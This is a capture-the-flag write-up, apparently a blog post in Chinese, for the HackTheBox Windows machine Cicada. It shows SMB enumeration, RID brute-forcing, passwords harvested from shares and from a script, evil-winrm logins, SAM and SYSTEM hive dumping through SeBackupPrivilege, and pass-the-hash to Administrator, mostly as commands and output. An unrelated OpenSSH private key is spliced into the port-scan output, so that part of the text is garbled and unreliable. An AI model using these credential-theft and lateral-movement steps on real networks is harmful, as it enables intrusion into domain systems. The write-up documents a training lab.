---
title: '[htb] Canada'
date: 2024-11-28 21:28 +0800
categories: [hack,HackTheBox]
tags: [windows,sebackupprivilege]
---

# information

1. **端口扫描**

   ```shell
   ╭─bamuwe@Mac ~/Desktop
   ╰─$ cat port_scan
   RT      STATE SERVICE
   53/tcp    open  domain
   88/tcp    open  kerberos-sec
   135/tcp   open  msrpc
   139/tcp   open  netbios-ssn
   389/tcp   open  ldap
   |_ssl-date: TLS randomness does not represent time
   | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
   | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
   | Not valid before: 2024-08-22T20:24:16
   |_Not valid after:  2025-08-22T20:24:16
   445/tcp   open  microsoft-ds
   464/tcp   open  kpasswd5
   593/tcp   open  http-rpc-epmap
   636/tcp   open  ldapssl
   |_ssl-date: TLS randomness does not represent time
   | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
   | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
   | Not valid before: 2024-08-22T20:24:16
   |_Not valid after:  2025-08-22T20:24:16
   3268/tcp  open  globalcatLDAP
   3269/tcp  open  globalcatLDAPssl
   |_ssl-date: TLS randomness does not represent time
   | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
   | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
   | Not valid before: 2024-08-22T20:24:16
   |_Not valid after:  2025-08-22T20:24:16
   5985/tcp  open  wsman
   64280/tcp open  unknown
   
   Host script results:
   | smb2-security-mode:
   |   3:1:1:
   |_    Message signing enabled and required
   | smb2-time:
   |   date: 2024-11-28T20:09:28
   |_  start_date: N/A
   |_clock-skew: 6h46m18s
   "-----BEGIN OPENSSH PRIVATE KEY-----\n",
       "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\n",
       "-----END OPENSSH PRIVATE KEY-----\n"
   
   ```

   ​	获得一个`CICADA-DC.cicada.htb`的域名。靶机开启了`smb`服务
   
# foothold

   ```shell
   ╭─bamuwe@Mac ~
   ╰─$ smbclient //10.10.11.35/HR
   Password for [WORKGROUP\bamuwe]:
   Try "help" to get a list of possible commands.
   smb: \> ls
     .                                   D        0  Thu Mar 14 20:29:09 2024
     ..                                  D        0  Thu Mar 14 20:21:29 2024
     Notice from HR.txt                  A     1266  Thu Aug 29 01:31:48 2024
   
                   4168447 blocks of size 4096. 419774 blocks available
   ```

有一个*Notice from HR.txt*，内容如下：

   > Dear new hire!
   >
   > Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.
   >
   > Your default password is: Cicada$M6Corpb*@Lp#nZp!8
   >
   > To change your password:
   >
   > 1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
   > 2. Once logged in, navigate to your account settings or profile settings section.
   > 3. Look for the option to change your password. This will be labeled as "Change Password".
   > 4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
   > 5. After changing your password, make sure to save your changes.
   >
   > Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.
   >
   > If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.
   >
   > Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!
   >
   > Best regards,
   > Cicada Corp

获得一个默认密码`Cicada$M6Corpb*@Lp#nZp!8`

爆破`smb_rid`

```shell
╭─bamuwe@Mac ~/Desktop
╰─$ crackmapexec smb cicada.htb -u "guest" -p ''  --rid-brute|grep 'SidTypeUser'
SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

通过获得的用户名，密码再进行枚举：

```shell
enum4linux-ng -A -u "michael.wrightson" -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35
...etc...
'1108':
  username: david.orelious
  name: (null)
  acb: '0x00000210'
  description: Just in case I forget my password is aRt$Lp#7t*VQ!3
```

**获得`user1`的凭据：`david.orelious/aRt$Lp#7t*VQ!3`**

通过这个user1登陆smb

```shell
╭─bamuwe@Mac ~/Desktop
╰─$ smbclient  //10.10.11.35/dev -U 'david.orelious'
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 20:31:39 2024
  ..                                  D        0  Thu Mar 14 20:21:29 2024
  Backup_script.ps1                   A      601  Thu Aug 29 01:28:22 2024

                4168447 blocks of size 4096. 419726 blocks available
smb: \>
```

获得`Backup_script.ps1`，内容如下：

> ╭─bamuwe@Mac ~/Desktop
> ╰─$ cat Backup_script.ps1
>
> $sourceDirectory = "C:\smb"
> $destinationDirectory = "D:\Backup"
>
> $username = "emily.oscars"
> $password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
> $credentials = New-Object System.Management.Automation.PSCredential($username, $password)
> $dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
> $backupFileName = "smb_backup_$dateStamp.zip"
> $backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
> Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
> Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"

**获得`user2`的凭据`emily.oscars/Q!3@Lp#M6b*7t*Vt`**

使用user2的凭据登陆

```shell
╭─bamuwe@Mac ~
╰─$ evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami
cicada\emily.oscars
```

# system

查看用户所有权限：

```shell
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== =============================================
cicada\emily.oscars S-1-5-21-917908876-1423158569-3159038727-1601


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

用户具有`SeBackupPrivilege `权限，参考:

> https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/

```shell
*Evil-WinRM* PS C:\Users> cd ..
*Evil-WinRM* PS C:\> mkdir Temp
An item with the specified name C:\Temp already exists.
At line:1 char:1
+ mkdir Temp
+ ~~~~~~~~~~
    + CategoryInfo          : ResourceExists: (C:\Temp:String) [New-Item], IOException
    + FullyQualifiedErrorId : DirectoryExist,Microsoft.PowerShell.Commands.NewItemCommand
*Evil-WinRM* PS C:\> reg save hklm\sam c:\Temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\system c:\Temp\system
The operation completed successfully.

*Evil-WinRM* PS C:\> cd Temp
*Evil-WinRM* PS C:\Temp> download sam

Info: Downloading C:\Temp\sam to sam

Info: Download successful!
*Evil-WinRM* PS C:\Temp> download system

Info: Downloading C:\Temp\system to system

Info: Download successful!
```

使用`pypykatz`抓取hash

> https://github.com/skelsec/pypykatz

```shell
╭─bamuwe@Mac ~
╰─$ pypykatz registry --sam sam system
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3c2b033757a49110a9ee680b46e8d620
============== SAM hive secrets ==============
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

登陆Administrator：

```shell
╭─bamuwe@Mac ~
╰─$ evil-winrm -i 10.10.11.35 -u 'Administrator' -H '2b87e7c93a3e8a0ea4a581937016f341'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
a23ecf7d220ac61860fd32d0050f4f9c
```

